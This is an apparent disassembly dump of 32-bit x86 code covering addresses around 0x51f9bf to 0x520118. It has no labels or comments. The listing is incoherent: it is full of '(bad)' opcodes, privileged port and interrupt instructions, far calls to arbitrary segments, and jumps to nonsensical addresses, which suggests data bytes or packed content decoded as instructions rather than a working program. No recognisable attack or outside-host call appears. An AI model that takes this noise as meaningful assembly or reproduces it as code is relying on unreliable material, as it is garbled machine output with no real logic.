  51f9bf:	or     DWORD PTR [edi+esi*4-0x34],eax
  51f9c3:	lahf   
  51f9c4:	std    
  51f9c5:	mov    ds:0x61841faa,al
  51f9ca:	sub    ebp,edi
  51f9cc:	pop    ss
  51f9cd:	pop    esp
  51f9ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51f9cf:	fisttp DWORD PTR [esi]
  51f9d1:	jl     0x51f961
  51f9d3:	or     al,0x29
  51f9d5:	pop    edi
  51f9d6:	adc    ch,BYTE PTR [edi+eax*1]
  51f9d9:	pop    esi
  51f9da:	bnd jg 0x51fa1f
  51f9dd:	mov    al,0xdb
  51f9df:	cmp    BYTE PTR [ebx-0x28],0x8a
  51f9e3:	dec    esi
  51f9e4:	push   esi
  51f9e5:	iret   
  51f9e6:	mov    edx,0xa1d4648b
  51f9eb:	add    al,0x88
  51f9ed:	ret    0xa235
  51f9f0:	cmp    esp,ebp
  51f9f2:	push   cs
  51f9f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51f9f4:	sub    ah,BYTE PTR [ecx-0x74]
  51f9f7:	push   es
  51f9f8:	mov    al,ds:0x695f988d
  51f9fd:	and    eax,0x85dbec00
  51fa02:	jno    0x51fa28
  51fa04:	sbb    eax,0x6accb219
  51fa09:	xchg   BYTE PTR [eax+0x19],al
  51fa0c:	call   0xf0ed:0x38c54e4
  51fa13:	scas   al,BYTE PTR es:[edi]
  51fa14:	adc    cl,BYTE PTR [ebx+0x282b80b1]
  51fa1a:	push   0x192c9bb1
  51fa1f:	lock inc esi
  51fa21:	mov    al,dl
  51fa23:	jg     0x51fa65
  51fa25:	jno    0x51f9ca
  51fa27:	adc    al,BYTE PTR ds:0xf5309a41
  51fa2d:	retfw  0xf31c
  51fa31:	cmp    al,0x6d
  51fa33:	sahf   
  51fa34:	test   eax,ecx
  51fa36:	xchg   esp,eax
  51fa37:	cmc    
  51fa38:	cdq    
  51fa39:	arpl   di,si
  51fa3b:	add    BYTE PTR [edi-0x2e73d169],0xfb
  51fa42:	add    eax,esp
  51fa44:	mov    ch,0x73
  51fa46:	arpl   WORD PTR [esi+edi*2+0x485bde19],dx
  51fa4d:	mov    ah,0x37
  51fa4f:	mov    es,WORD PTR [ebp-0x68dbc08f]
  51fa55:	jge    0x51f9ef
  51fa57:	addr16 clc 
  51fa59:	enter  0x31fb,0xdd
  51fa5d:	cmp    edi,DWORD PTR [esi+0x47]
  51fa60:	lods   al,BYTE PTR ds:[esi]
  51fa61:	das    
  51fa62:	in     al,0xa7
  51fa64:	ja     0xee6e0f7b
  51fa6a:	or     ebp,DWORD PTR [ebp-0x51]
  51fa6d:	ret    0x8755
  51fa70:	jns    0x51fadf
  51fa72:	(bad)  
  51fa74:	ds cmp bl,bh
  51fa77:	inc    esp
  51fa78:	adc    BYTE PTR [edx-0x20],al
  51fa7b:	cwde   
  51fa7c:	sbb    ebx,DWORD PTR [edx+ebp*1+0x48477bd4]
  51fa83:	cmp    DWORD PTR [ebx-0x4f],0x1c
  51fa87:	dec    ebx
  51fa88:	dec    edx
  51fa89:	sahf   
  51fa8a:	add    BYTE PTR [ecx],0x70
  51fa8d:	out    dx,al
  51fa8e:	and    eax,0xffffffed
  51fa91:	imul   esp,DWORD PTR [ebx+0xd776cf8],0xffffff93
  51fa98:	mov    bl,0xf3
  51fa9a:	xor    DWORD PTR [ebp-0x79],0x24
  51fa9e:	jns    0x51facf
  51faa0:	jb     0x51faa8
  51faa2:	ja     0x51fadf
  51faa4:	pop    esp
  51faa5:	xor    BYTE PTR ds:0xf177a0ea,dl
  51faab:	rcl    DWORD PTR [edx],cl
  51faad:	rsm    
  51faaf:	mul    BYTE PTR [eax]
  51fab1:	repz fmulp st(7),st
  51fab4:	push   edx
  51fab5:	dec    ebx
  51fab6:	daa    
  51fab7:	xchg   edx,eax
  51fab8:	stos   DWORD PTR es:[edi],eax
  51fab9:	push   es
  51faba:	and    BYTE PTR [eax],bh
  51fabc:	fs test eax,0x1a5e09bb
  51fac2:	sub    BYTE PTR [ecx+edx*8+0x1e],al
  51fac6:	pop    es
  51fac7:	int    0x6f
  51fac9:	call   0x2800:0x4dfc846c
  51fad0:	dec    eax
  51fad1:	cs cmp al,0xff
  51fad4:	mov    ds:0x14db329f,eax
  51fad9:	mov    cl,ah
  51fadb:	(bad)  
  51fadd:	jno    0x51fa9e
  51fadf:	mov    al,ds:0x377b2e58
  51fae4:	dec    edx
  51fae5:	cs mov esp,0x97101e5f
  51faeb:	ja     0x51fb2b
  51faed:	outs   dx,BYTE PTR ds:[esi]
  51faee:	(bad)  
  51faef:	mov    ds:0x211bef8f,al
  51faf4:	daa    
  51faf5:	shl    edi,1
  51faf7:	adc    BYTE PTR [eax+0x72],cl
  51fafa:	out    0xcb,eax
  51fafc:	iret   
  51fafd:	push   ds
  51fafe:	push   eax
  51faff:	ss mov ah,0xfb
  51fb02:	adc    esi,DWORD PTR [esi+0x4c]
  51fb05:	or     ebp,DWORD PTR [ecx-0x33]
  51fb08:	pop    ebp
  51fb09:	dec    eax
  51fb0a:	sub    DWORD PTR [eax],0x895a944b
  51fb10:	aam    0xae
  51fb12:	mov    al,ds:0x741907b1
  51fb17:	fwait
  51fb18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51fb19:	into   
  51fb1a:	and    eax,0x50d5cd4d
  51fb1f:	(bad)  
  51fb20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51fb21:	lock test BYTE PTR [ebp+0x52],bl
  51fb25:	loop   0x51fafe
  51fb27:	add    BYTE PTR [edx+0x27d3eecc],dl
  51fb2d:	push   edi
  51fb2e:	arpl   cx,cx
  51fb30:	iret   
  51fb31:	jno    0x51fb9c
  51fb33:	push   edx
  51fb34:	dec    edx
  51fb35:	aad    0x65
  51fb37:	repnz loopne 0x51fb64
  51fb3a:	(bad)  
  51fb3b:	out    0x2c,eax
  51fb3d:	scas   eax,DWORD PTR es:[edi]
  51fb3e:	fstp   TBYTE PTR [ebx+0x2583f824]
  51fb44:	pop    eax
  51fb45:	mov    ebx,0x91b01df3
  51fb4a:	mov    ebp,0x1ae029d0
  51fb4f:	addr16 mov esi,0x9b662df8
  51fb55:	lock loope 0x51fb29
  51fb58:	push   edx
  51fb59:	xchg   ebp,eax
  51fb5a:	push   cs
  51fb5b:	adc    dh,ch
  51fb5d:	cmc    
  51fb5e:	dec    ebx
  51fb5f:	inc    ebx
  51fb60:	xor    bl,bh
  51fb62:	cld    
  51fb63:	call   DWORD PTR [edi-0x58]
  51fb66:	xchg   ebx,eax
  51fb67:	add    al,BYTE PTR [edi]
  51fb69:	jmp    0x9a095dd2
  51fb6e:	mov    al,0x89
  51fb70:	xor    ebp,edx
  51fb72:	loope  0x51fbcc
  51fb74:	or     edx,DWORD PTR [ebp-0x6f2023ec]
  51fb7a:	fst    QWORD PTR [edi]
  51fb7c:	loopne 0x51fb5e
  51fb7e:	arpl   WORD PTR [edx],bx
  51fb80:	ins    BYTE PTR es:[edi],dx
  51fb81:	sbb    ebx,DWORD PTR [edx-0x13]
  51fb84:	mov    DWORD PTR [ecx+0x756042ca],eax
  51fb8a:	xchg   ebx,eax
  51fb8b:	push   ebp
  51fb8c:	iret   
  51fb8d:	jno    0x51fb99
  51fb8f:	ins    BYTE PTR es:[edi],dx
  51fb90:	icebp  
  51fb91:	stos   DWORD PTR es:[edi],eax
  51fb92:	rcr    DWORD PTR [eax+0x1933887e],cl
  51fb98:	sub    BYTE PTR [edi+0x4cc96d3d],0xee
  51fb9f:	xor    eax,0x108f2a84
  51fba4:	lock or eax,0xf0b3642e
  51fbaa:	ja     0x51fb36
  51fbac:	les    ebx,FWORD PTR [esi-0x3bb16f23]
  51fbb2:	into   
  51fbb3:	stos   DWORD PTR es:[edi],eax
  51fbb4:	out    dx,eax
  51fbb5:	cmp    al,0x50
  51fbb7:	inc    ebp
  51fbb8:	cmp    al,0xc3
  51fbba:	xchg   edi,eax
  51fbbb:	jo     0x51fbf9
  51fbbd:	inc    esp
  51fbbe:	xchg   ebp,eax
  51fbbf:	scas   al,BYTE PTR es:[edi]
  51fbc0:	xor    ebx,ecx
  51fbc2:	mov    dh,0x14
  51fbc4:	stc    
  51fbc5:	gs cmp ch,dh
  51fbc8:	sub    eax,0x823ed58
  51fbcd:	push   edi
  51fbce:	cmp    al,ah
  51fbd0:	and    eax,0x6ea51b05
  51fbd5:	mov    ch,0xe7
  51fbd7:	mov    ebp,0x39edeac8
  51fbdc:	jg     0x51fc3a
  51fbde:	pop    ebp
  51fbdf:	sbb    al,0x73
  51fbe1:	mov    edi,0x1226620b
  51fbe6:	jle    0x51fb81
  51fbe8:	loopne 0x51fc67
  51fbea:	push   esi
  51fbeb:	xor    eax,0x42dddc9a
  51fbf0:	js     0x51fbd5
  51fbf2:	sbb    ebx,DWORD PTR ds:0x43ad7f22
  51fbf8:	add    eax,0x5ca3d5d7
  51fbfd:	pushf  
  51fbfe:	fsubr  st,st(3)
  51fc00:	inc    ecx
  51fc01:	bnd jb 0x51fbae
  51fc04:	sbb    cl,BYTE PTR [ebx]
  51fc06:	sbb    eax,0xe91788d8
  51fc0b:	iret   
  51fc0c:	jp     0x51fc8c
  51fc0e:	test   DWORD PTR [esi+0x6e],edx
  51fc11:	enter  0xdc15,0x5b
  51fc15:	and    DWORD PTR [ecx-0x17a1052f],esi
  51fc1b:	and    eax,0x67cd38ef
  51fc20:	out    dx,al
  51fc21:	and    al,0xfb
  51fc23:	sar    DWORD PTR [edi],0x45
  51fc26:	scas   eax,DWORD PTR es:[edi]
  51fc27:	xlat   BYTE PTR ds:[ebx]
  51fc28:	lahf   
  51fc29:	and    BYTE PTR [ebx],bh
  51fc2b:	mov    al,ds:0x629b2acb
  51fc30:	shl    BYTE PTR [ecx+0x56d78415],0x32
  51fc37:	cwde   
  51fc38:	(bad)  
  51fc39:	out    dx,eax
  51fc3a:	arpl   WORD PTR [edx+0x5d9b7321],ax
  51fc40:	js     0x51fbce
  51fc42:	add    edx,DWORD PTR ds:0x3420cf3c
  51fc48:	lea    edi,[ecx+0x680dea0a]
  51fc4e:	add    eax,0x6560c749
  51fc53:	nop
  51fc54:	sahf   
  51fc55:	push   ebp
  51fc56:	inc    ebp
  51fc57:	inc    ah
  51fc59:	daa    
  51fc5a:	push   edx
  51fc5b:	xor    ch,BYTE PTR [edi+edx*2-0x566ab796]
  51fc62:	pop    esi
  51fc63:	jb     0x51fc78
  51fc65:	lods   al,BYTE PTR ds:[esi]
  51fc66:	and    dh,BYTE PTR [edx-0x3f65400e]
  51fc6c:	stc    
  51fc6d:	xchg   esi,eax
  51fc6e:	repnz fcomi st,st(0)
  51fc71:	mov    eax,ebp
  51fc73:	(bad)  
  51fc74:	pop    eax
  51fc75:	nop
  51fc76:	aam    0xa7
  51fc78:	scas   eax,DWORD PTR es:[edi]
  51fc79:	loop   0x51fc18
  51fc7b:	into   
  51fc7c:	ins    BYTE PTR es:[edi],dx
  51fc7d:	scas   al,BYTE PTR es:[edi]
  51fc7e:	sbb    BYTE PTR [esi],0x7a
  51fc81:	mul    DWORD PTR [edi]
  51fc83:	outs   dx,DWORD PTR ds:[esi]
  51fc84:	pop    eax
  51fc85:	popa   
  51fc86:	popa   
  51fc87:	in     eax,0x85
  51fc89:	or     BYTE PTR [ebp+0x4b7e591c],0x4d
  51fc90:	mov    ch,bh
  51fc92:	inc    ecx
  51fc93:	mov    al,0x2e
  51fc95:	push   edi
  51fc96:	in     eax,dx
  51fc97:	lds    esi,FWORD PTR [esi]
  51fc99:	fs xchg ecx,eax
  51fc9b:	js     0x51fc4f
  51fc9d:	jmp    0x51fc56
  51fc9f:	mov    ah,0x64
  51fca1:	inc    ecx
  51fca2:	out    0x42,al
  51fca4:	push   edx
  51fca5:	inc    esp
  51fca6:	into   
  51fca7:	lods   al,BYTE PTR ds:[esi]
  51fca8:	and    edi,ecx
  51fcaa:	xchg   edx,eax
  51fcab:	dec    ebx
  51fcac:	mov    cl,0x39
  51fcae:	lea    ebp,[esi-0x3abdcaf4]
  51fcb4:	popa   
  51fcb5:	in     eax,0x93
  51fcb7:	xor    BYTE PTR [edi],0x87
  51fcba:	jno    0x51fc48
  51fcbc:	cdq    
  51fcbd:	adc    al,0x50
  51fcbf:	dec    ebx
  51fcc0:	jg     0x51fccb
  51fcc2:	out    0x67,eax
  51fcc4:	dec    esp
  51fcc5:	xor    eax,0x17a24d33
  51fcca:	mov    ebp,0xcca0f274
  51fccf:	lds    ebx,FWORD PTR [eax]
  51fcd1:	ret    
  51fcd2:	mov    ebx,DWORD PTR [edx+0x694c4520]
  51fcd8:	mov    ds:0x3edb58be,eax
  51fcdd:	adc    al,0x4
  51fcdf:	ret    
  51fce0:	out    dx,eax
  51fce1:	jl     0x51fccd
  51fce3:	ja     0x51fd2e
  51fce5:	lock pop edx
  51fce7:	mov    eax,ds:0xea743ae3
  51fcec:	and    ch,BYTE PTR [eax-0xd1973c9]
  51fcf2:	push   eax
  51fcf3:	rcr    BYTE PTR ds:[edi+eiz*2],cl
  51fcf7:	jp     0x51fd4d
  51fcf9:	dec    esi
  51fcfa:	int    0xd7
  51fcfc:	lds    eax,FWORD PTR [eax-0x29]
  51fcff:	jno    0x51fcd2
  51fd01:	fsubr  st,st(6)
  51fd03:	sub    eax,0x47350dc
  51fd08:	jo     0x51fcc3
  51fd0a:	cs aad 0x5
  51fd0d:	add    esp,DWORD PTR [esi+0x5c498854]
  51fd13:	add    al,0x1f
  51fd15:	sub    BYTE PTR [ebp-0x25fcfb4f],ah
  51fd1b:	jno    0x51fcee
  51fd1d:	xlat   BYTE PTR ds:[ebx]
  51fd1e:	xor    bl,dl
  51fd20:	push   cs
  51fd21:	bswap  ebp
  51fd23:	or     al,0x37
  51fd25:	xchg   edi,eax
  51fd26:	mov    ah,0xca
  51fd28:	dec    eax
  51fd29:	fisub  DWORD PTR [edx-0x28df4a78]
  51fd2f:	sub    BYTE PTR [ecx],ah
  51fd31:	ds (bad) 
  51fd33:	fistp  WORD PTR [edx]
  51fd35:	mov    bh,0x8
  51fd37:	add    ch,ah
  51fd39:	repz add al,0xf2
  51fd3c:	sbb    DWORD PTR [edi],edx
  51fd3e:	sahf   
  51fd3f:	das    
  51fd40:	cmp    DWORD PTR [ebp+0x57],esi
  51fd43:	xchg   esi,eax
  51fd44:	retf   0x8c72
  51fd47:	sub    al,0x8
  51fd49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51fd4a:	adc    BYTE PTR [edi-0x55],ch
  51fd4d:	inc    ebx
  51fd4e:	xchg   ecx,eax
  51fd4f:	idiv   BYTE PTR [ecx+edi*2+0x74334df]
  51fd56:	enter  0x620,0x2d
  51fd5a:	dec    edi
  51fd5b:	leave  
  51fd5c:	cwde   
  51fd5d:	inc    edx
  51fd5e:	arpl   WORD PTR [ebp-0x464bb2c1],sp
  51fd64:	scas   eax,DWORD PTR es:[edi]
  51fd65:	mov    ds,ecx
  51fd67:	sub    DWORD PTR fs:[esi],edx
  51fd6a:	inc    ecx
  51fd6b:	adc    eax,0xc8d630d8
  51fd70:	aaa    
  51fd71:	mov    cl,0xc1
  51fd73:	cmp    edi,DWORD PTR [eax+edi*8-0x1c]
  51fd77:	mov    esp,0xb01dc0d0
  51fd7c:	mov    edi,0xed17fb2b
  51fd81:	jl     0xfa0528ff
  51fd87:	(bad)  
  51fd89:	mov    esi,0x666f6dc9
  51fd8e:	out    0x37,eax
  51fd90:	rcl    BYTE PTR [ebx-0x2b],cl
  51fd93:	mov    ecx,0xac9f6ae4
  51fd98:	pop    esi
  51fd99:	arpl   WORD PTR [eax-0x33],si
  51fd9c:	pop    ecx
  51fd9d:	sub    bl,BYTE PTR [esi]
  51fd9f:	mov    ch,0x63
  51fda1:	fld    TBYTE PTR [edx-0x1d7a889b]
  51fda7:	push   ebp
  51fda8:	xor    al,cl
  51fdaa:	sbb    BYTE PTR [ebp-0x41b29cfa],bh
  51fdb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51fdb1:	arpl   WORD PTR [edi-0x41],dx
  51fdb4:	mov    es,edx
  51fdb6:	jnp    0x51fd8b
  51fdb8:	add    eax,0xf8fc158b
  51fdbd:	(bad)  
  51fdbe:	pop    ebx
  51fdbf:	jge    0x51fddc
  51fdc1:	ret    0xbc4d
  51fdc4:	xor    al,BYTE PTR [esi-0x78]
  51fdc7:	mov    bl,0x26
  51fdc9:	rcl    BYTE PTR [esi+0x4],cl
  51fdcc:	test   BYTE PTR [ebx],bl
  51fdce:	test   DWORD PTR ds:0xd78779f8,esi
  51fdd4:	adc    cl,bh
  51fdd6:	test   al,0x2c
  51fdd8:	mov    al,ds:0xbd74f035
  51fddd:	add    eax,0xa74f992c
  51fde2:	repnz into 
  51fde4:	(bad)  
  51fde5:	stc    
  51fde6:	and    eax,DWORD PTR [ebx-0x30]
  51fde9:	ficomp WORD PTR [edi+0x34d9dff5]
  51fdef:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  51fdf1:	mov    ch,0x7f
  51fdf3:	push   esi
  51fdf4:	sub    al,0x9
  51fdf6:	xor    BYTE PTR ds:0x52bb438,bl
  51fdfc:	stc    
  51fdfd:	fcomp  DWORD PTR [edi+eiz*8+0x3ec6a0ba]
  51fe04:	push   cs
  51fe05:	call   0xc870:0xfaf75aff
  51fe0c:	sub    dl,0xc3
  51fe0f:	cmp    BYTE PTR [edi],bh
  51fe11:	xor    DWORD PTR [ebx],0xd683926e
  51fe17:	dec    edx
  51fe18:	jl     0x51fe13
  51fe1a:	xchg   ebx,eax
  51fe1b:	add    bl,ah
  51fe1d:	imul   ebp,DWORD PTR [esi],0x25
  51fe20:	ret    
  51fe21:	loop   0x51fe39
  51fe23:	sub    bl,dl
  51fe25:	mov    dh,0x6c
  51fe27:	std    
  51fe28:	xor    BYTE PTR [ecx],0x3d
  51fe2b:	fmul   st,st(5)
  51fe2d:	out    dx,al
  51fe2e:	jecxz  0x51fdb5
  51fe30:	xor    ecx,esp
  51fe32:	and    DWORD PTR [edx+edx*2-0x60],ecx
  51fe36:	ins    BYTE PTR es:[edi],dx
  51fe37:	dec    ebx
  51fe38:	ror    esi,0xe3
  51fe3b:	xchg   ebx,eax
  51fe3c:	cli    
  51fe3d:	jmp    0x51fde9
  51fe3f:	fwait
  51fe40:	pop    ecx
  51fe41:	xchg   ebp,eax
  51fe42:	sbb    dl,dh
  51fe44:	inc    ebx
  51fe45:	aas    
  51fe46:	add    dh,ch
  51fe48:	mov    ds:0x398fdc36,eax
  51fe4d:	xchg   ebx,eax
  51fe4e:	adc    eax,0x4be3c034
  51fe53:	mov    ch,0x37
  51fe55:	sbb    BYTE PTR [edx],bl
  51fe57:	ret    
  51fe58:	and    al,0x54
  51fe5a:	dec    edx
  51fe5b:	xor    al,0xfd
  51fe5d:	mov    eax,ds:0x1b6631a8
  51fe62:	int    0x7d
  51fe64:	or     al,0x15
  51fe66:	lods   al,BYTE PTR ds:[esi]
  51fe67:	push   edx
  51fe68:	out    dx,al
  51fe69:	pop    ss
  51fe6a:	aam    0x59
  51fe6c:	sub    ch,dl
  51fe6e:	pop    ecx
  51fe6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51fe70:	enter  0x6445,0x97
  51fe74:	cmp    DWORD PTR [eax-0x12e12ca4],esp
  51fe7a:	jns    0x51feed
  51fe7c:	inc    ebp
  51fe7d:	aas    
  51fe7e:	cmp    eax,0x159ea474
  51fe83:	enter  0x9fa,0x91
  51fe87:	pop    ebx
  51fe88:	mov    esp,0xa0dad731
  51fe8d:	cmp    ah,ah
  51fe8f:	xchg   esi,eax
  51fe90:	dec    esp
  51fe91:	mov    ds,WORD PTR [ecx-0x575d238b]
  51fe97:	sub    ebx,ecx
  51fe99:	dec    edi
  51fe9a:	sub    al,ah
  51fe9c:	sbb    al,BYTE PTR [edi]
  51fe9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51fe9f:	je     0x51fe51
  51fea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51fea2:	inc    ebx
  51fea3:	test   DWORD PTR [edi],edx
  51fea5:	mov    eax,ds:0xf2f7ce5b
  51feaa:	out    0x84,eax
  51feac:	mov    bl,dh
  51feae:	push   esp
  51feaf:	scas   al,BYTE PTR es:[edi]
  51feb0:	in     eax,dx
  51feb1:	add    DWORD PTR [ecx+0x57fd7cbd],eax
  51feb7:	and    al,0xb2
  51feb9:	loopne 0x51ff39
  51febb:	cmc    
  51febc:	inc    esi
  51febd:	push   esp
  51febe:	das    
  51febf:	mov    esi,0x7c76af0f
  51fec4:	mov    edx,0xb56dd605
  51fec9:	int    0x88
  51fecb:	cmp    BYTE PTR [edx+0x612cb3a1],0xce
  51fed2:	div    DWORD PTR [eax+0xd0050f8]
  51fed8:	mov    ds:0x8e3d988c,eax
  51fedd:	mov    bh,0x9d
  51fedf:	ror    esp,0x74
  51fee2:	movzx  esi,bx
  51fee5:	pop    ebp
  51fee6:	sub    bl,BYTE PTR [ebx-0xff4a302]
  51feec:	jo     0x51fef7
  51feee:	mov    dl,0xac
  51fef0:	inc    ebx
  51fef1:	call   0x61ffb8f8
  51fef6:	dec    edi
  51fef7:	and    eax,0x485380c
  51fefc:	mov    esp,0x27528666
  51ff01:	gs mov bl,0xfc
  51ff04:	loope  0x51ff17
  51ff06:	aad    0x71
  51ff08:	jl     0x51ff82
  51ff0a:	sbb    eax,ecx
  51ff0c:	aam    0x5e
  51ff0e:	in     al,dx
  51ff0f:	mov    bh,0xf9
  51ff11:	addr16 cmp al,0xf9
  51ff14:	pusha  
  51ff15:	mov    ecx,0x2cf5842a
  51ff1a:	ss (bad) 
  51ff1c:	shr    ebx,cl
  51ff1e:	sub    edi,esi
  51ff20:	push   esp
  51ff21:	lahf   
  51ff22:	iret   
  51ff23:	ins    DWORD PTR es:[edi],dx
  51ff24:	or     bh,al
  51ff26:	sti    
  51ff27:	mov    ds:0x9ebe7aae,al
  51ff2c:	dec    esp
  51ff2d:	dec    edx
  51ff2e:	mov    bh,0x53
  51ff30:	push   0x53
  51ff32:	ret    0x4dc0
  51ff35:	push   ss
  51ff36:	cld    
  51ff37:	sub    al,0x5
  51ff39:	je     0x51fee0
  51ff3b:	int3   
  51ff3c:	push   ebp
  51ff3d:	inc    ecx
  51ff3e:	push   cs
  51ff3f:	out    dx,al
  51ff40:	sub    ch,bl
  51ff42:	out    dx,al
  51ff43:	ficomp WORD PTR [edx+0x7b566b7b]
  51ff49:	sti    
  51ff4a:	mov    dh,0xc
  51ff4c:	mov    ch,0xc7
  51ff4e:	mov    ds:0x5bed9395,eax
  51ff53:	add    bh,BYTE PTR [edx]
  51ff55:	jle    0x51ff74
  51ff57:	outs   dx,BYTE PTR ds:[esi]
  51ff58:	sbb    ebp,ecx
  51ff5a:	mul    edi
  51ff5c:	stos   DWORD PTR es:[edi],eax
  51ff5d:	mov    WORD PTR [ecx+0x2f],cs
  51ff60:	fidiv  DWORD PTR [ebp-0x2542a8c7]
  51ff66:	and    al,0x93
  51ff68:	mov    ds:0x752a4108,al
  51ff6d:	aaa    
  51ff6e:	imul   edx,DWORD PTR [esi+esi*8-0x5b],0x56
  51ff73:	stos   BYTE PTR es:[edi],al
  51ff74:	cmp    dl,BYTE PTR [ecx+0x6bdd15e8]
  51ff7a:	ja     0x51ffd5
  51ff7c:	pop    edx
  51ff7d:	cli    
  51ff7e:	enter  0xc1d1,0x73
  51ff82:	addr16 sub esi,edi
  51ff85:	out    dx,eax
  51ff86:	addr16 (bad) 
  51ff88:	call   0x41e5:0x102024dc
  51ff8f:	mov    edx,0x7fa80801
  51ff94:	adc    BYTE PTR ds:0x66d160c6,0x4a
  51ff9b:	popa   
  51ff9c:	fsubr  QWORD PTR [edx]
  51ff9e:	in     eax,dx
  51ff9f:	ret    0x4ab2
  51ffa2:	pop    ss
  51ffa3:	in     eax,dx
  51ffa4:	push   edi
  51ffa5:	jne    0x51ff8a
  51ffa7:	enter  0x89b2,0x83
  51ffab:	std    
  51ffac:	(bad)
  51ffb1:	test   al,0x7d
  51ffb3:	add    BYTE PTR [ebp-0x7e666f0],dh
  51ffb9:	lods   eax,DWORD PTR ds:[esi]
  51ffba:	dec    esp
  51ffbb:	sbb    bl,ah
  51ffbd:	test   al,0xdc
  51ffbf:	repnz xchg edx,eax
  51ffc1:	push   edi
  51ffc2:	inc    esi
  51ffc3:	jle    0x51ffea
  51ffc5:	es in  eax,dx
  51ffc7:	mov    dl,0x33
  51ffc9:	lods   al,BYTE PTR ds:[esi]
  51ffca:	shl    BYTE PTR [edx-0x17cdec6b],1
  51ffd0:	js     0x520001
  51ffd2:	fist   DWORD PTR [eax-0x51]
  51ffd5:	mov    DWORD PTR [edx-0x6322e07c],0x8a1efa81
  51ffdf:	sub    DWORD PTR [edx-0xf],edi
  51ffe2:	cld    
  51ffe3:	push   eax
  51ffe4:	or     al,BYTE PTR [edx]
  51ffe6:	sbb    al,0x5c
  51ffe8:	cdq    
  51ffe9:	push   ecx
  51ffea:	or     eax,0x43d9d926
  51ffef:	adc    DWORD PTR [eax+ebp*2],ebx
  51fff2:	imul   edi,DWORD PTR [edx-0x7e],0xffffffef
  51fff6:	jp     0x520050
  51fff8:	daa    
  51fff9:	xor    ch,BYTE PTR [edx]
  51fffb:	fiadd  WORD PTR cs:[ecx-0x469c0d31]
  520002:	xchg   ecx,eax
  520003:	add    al,0x5
  520005:	test   BYTE PTR [ebx+0x8],ch
  520008:	es daa 
  52000a:	ficomp WORD PTR fs:[edx+0x2a5b3348]
  520011:	pop    ebx
  520012:	cmc    
  520013:	test   eax,0xb48a1527
  520018:	(bad)  
  520019:	sub    BYTE PTR [edx+eax*4-0x43],bl
  52001d:	ins    DWORD PTR es:[edi],dx
  52001e:	xchg   ebp,eax
  52001f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  520020:	adc    al,0x59
  520022:	test   al,0xd0
  520024:	mov    ds:0x2050bcfd,al
  520029:	lahf   
  52002a:	mov    dh,BYTE PTR [ecx+0x36]
  52002d:	mov    edx,DWORD PTR [ecx]
  52002f:	aad    0xa3
  520031:	outs   dx,DWORD PTR ds:[esi]
  520032:	jbe    0x51ffed
  520034:	test   al,0x8f
  520036:	jmp    0x4aa:0xcc871d10
  52003d:	adc    ah,BYTE PTR [esi+0x3b]
  520040:	mov    bl,0xe9
  520042:	push   eax
  520043:	mov    cl,0x6e
  520045:	mov    dh,0xef
  520047:	push   edi
  520048:	in     eax,0x2d
  52004a:	into   
  52004b:	(bad)  
  52004c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52004d:	pop    edx
  52004e:	dec    esp
  52004f:	and    ebp,DWORD PTR [ebp-0x73ddcf5b]
  520055:	fld    DWORD PTR [ebx]
  520057:	outs   dx,DWORD PTR ds:[esi]
  520058:	fisub  WORD PTR [edi]
  52005a:	addr16 pop ecx
  52005c:	cmp    bl,BYTE PTR [ecx]
  52005e:	pop    ss
  52005f:	clc    
  520060:	pop    ds
  520061:	aam    0xd3
  520063:	bound  edi,QWORD PTR [ebx]
  520065:	fisttp DWORD PTR [esi]
  520067:	xchg   ecx,eax
  520068:	or     al,0xd4
  52006a:	xchg   edx,eax
  52006b:	xchg   bl,dl
  52006d:	push   eax
  52006e:	enterw 0xfc4d,0x6f
  520073:	adc    eax,0x28821f17
  520078:	pop    ebx
  520079:	hlt    
  52007a:	xchg   BYTE PTR [esi+0x68ab4e0],al
  520080:	sbb    al,0x9b
  520082:	or     esp,DWORD PTR [edx+0x6f]
  520085:	and    cx,WORD PTR [esi-0x319ed807]
  52008c:	pop    esp
  52008d:	rcr    BYTE PTR [eax],cl
  52008f:	clc    
  520090:	mov    ah,0xc8
  520092:	mov    bl,0xb1
  520094:	stc    
  520095:	test   edx,esp
  520097:	hlt    
  520098:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  520099:	scas   eax,DWORD PTR es:[edi]
  52009a:	sar    al,cl
  52009c:	shl    BYTE PTR [esi-0x67],cl
  52009f:	pop    edx
  5200a0:	shl    BYTE PTR [ebx+0x26547475],1
  5200a6:	sub    eax,0x538306a0
  5200ab:	sub    eax,0xc79bc240
  5200b0:	in     eax,dx
  5200b1:	sbb    eax,0xff34ed68
  5200b6:	ret    0x9025
  5200b9:	sbb    cl,0x31
  5200bc:	pop    es
  5200bd:	inc    ebx
  5200be:	fsubr  QWORD PTR es:[esi-0x10142222]
  5200c5:	adc    eax,0xadd7eb5b
  5200ca:	ins    BYTE PTR es:[edi],dx
  5200cb:	dec    edx
  5200cc:	int3   
  5200cd:	shl    ebx,cl
  5200cf:	add    esp,DWORD PTR [ebp+0x2f4463a]
  5200d5:	or     DWORD PTR [ebx+0x7ae7be53],ecx
  5200db:	adc    eax,DWORD PTR [edi]
  5200dd:	add    BYTE PTR [edx+0x64],0x4f
  5200e1:	arpl   WORD PTR [edx],cx
  5200e3:	ret    0x819f
  5200e6:	sbb    al,0xf4
  5200e8:	test   DWORD PTR [ebp+ebx*2-0x6b],0x3a9e854e
  5200f0:	dec    DWORD PTR [edx+ebp*8-0x7dda1a89]
  5200f7:	in     al,0x62
  5200f9:	mov    bh,0x3a
  5200fb:	pop    edx
  5200fc:	nop
  5200fd:	xor    eax,0x666b4b00
  520102:	sbb    esp,DWORD PTR [ebx-0x27]
  520105:	xchg   edi,eax
  520106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  520107:	retf   
  520108:	mov    al,0xdb
  52010a:	es jp  0x5200ec
  52010d:	cmp    DWORD PTR [eax+0x4c8c80e6],0xfaf0259f
  520117:	retf   
  520118:	fld    DWORD PTR [ecx+0x5d]
